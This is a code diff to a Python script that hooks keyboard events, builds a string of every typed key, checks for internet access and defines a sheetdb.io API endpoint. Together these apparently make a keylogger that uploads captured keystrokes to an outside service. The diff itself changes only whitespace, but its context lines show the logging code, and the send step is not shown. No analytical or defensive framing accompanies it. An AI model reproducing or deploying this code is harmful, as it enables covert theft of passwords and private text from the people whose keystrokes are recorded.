@@ -3,11 +3,16 @@ import keyboard
 import requests
 
 def internet_connection():
+
     try:
         response = requests.get('https://www.google.com/', timeout=5)
+        
         return True
+        
     except requests.ConnectionError:
+    
         return False    
+        
 
 url = ' https://sheetdb.io/api/v1/aup7h1yb0yvlt '
 
@@ -20,15 +25,25 @@ def on_k(e):
     if e.event_type  == keyboard.KEY_DOWN and e.name not in elemet_delet and internet_connection():
         
         if e.name != "alt gr":
+        
             if e.name == "enter":
+            
                 lis.append("#")
+                
             elif e.name == "decimal":
+            
                 lis.append(".")
+                
             elif e.name == "space":
+            
                 lis.append(" ")
+                
             elif e.name == "backspace":
+            
                 lis.pop()
+                
             else:
+            
                 lis.append(e.name)
            
             x = "".join(str(x) for x in lis)
